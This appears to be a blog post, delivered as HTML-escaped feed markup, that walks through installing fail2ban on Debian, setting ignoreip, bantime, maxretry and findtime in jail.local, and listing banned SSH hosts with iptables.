&lt;p&gt;Let’s us begin with the installation step.&lt;/p&gt;

&lt;p&gt;For &lt;strong&gt;Debian&lt;/strong&gt;, execute the following command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;fail2ban
Reading package lists... Done
Building dependency tree       
Reading state information... Done
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few seconds, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; should be ready for further configuring.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;configuring-fail2ban&quot;&gt;&lt;strong&gt;Configuring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;[1]. On the terminal, we execute&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cp&lt;/span&gt; /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail.local&lt;/code&gt; is a custom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; configuration. In other words, we can adjust the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail.local&lt;/code&gt; file to suite our purposes and avoid overwriting the default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; configurations.&lt;/p&gt;

&lt;p&gt;[2]. Open the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail.local&lt;/code&gt; file, there are some useful configuration by default.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ignoreip&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ignoreip = 127.0.0.1/8 10.10.10.21&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ Specified IP addresses won’t be banned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;, separated with a space.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;bantime&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bantime  = 600&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ The default ban time is 600 secs (10 mins).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;maxretry&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxretry = 5&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ The number of failures before a host get banned.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;findtime&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;findtime = 600&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ Used with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxretry&lt;/code&gt;, if a host exceeds 5 failed login attempts within 600 seconds, it will be banned.&lt;/p&gt;

&lt;p&gt;It’s worth noticing that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; monitors SSH login attempts by default.&lt;/p&gt;

&lt;p&gt;To reconfigure each service, we navigate to that specific service.&lt;/p&gt;

&lt;p&gt;For instance, to rule &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, we navigate to the line 215 of the default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail2.local&lt;/code&gt; configuration file, it might looks like the following.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sshd]

port    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ssh
logpath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sshd_log&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;s


&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sshd-ddos]
&lt;span class=&quot;c&quot;&gt;# This jail corresponds to the standard configuration in Fail2ban.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The mail-whois action send a notification e-mail with a whois request&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# in the body.&lt;/span&gt;
port    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ssh
logpath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sshd_log&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;s
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[3]. Save the file and restart the application to adapt new rules.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;service fail2ban restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[4]. To display the banned IP, we execute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; fail2ban-SSH &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.0.12/24 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REJECT &lt;span class=&quot;nt&quot;&gt;--reject-with&lt;/span&gt; icmp-port-unreachable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;reference&quot;&gt;&lt;strong&gt;Reference&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;A2 Hosting:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    https://www.a2hosting.com/kb/security/hardening-a-server-with-fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="blueteam" /><category term="fail2ban" /><category term="defense" /><summary type="html">Overview of fail2ban The fail2ban application will monitor the abnormalities of intrusion attempts accross multiple services including HTTP, SSH, etc. If an IP address is marked as suspicious, fail2ban will block it for a specific duration.</summary></entry></feed>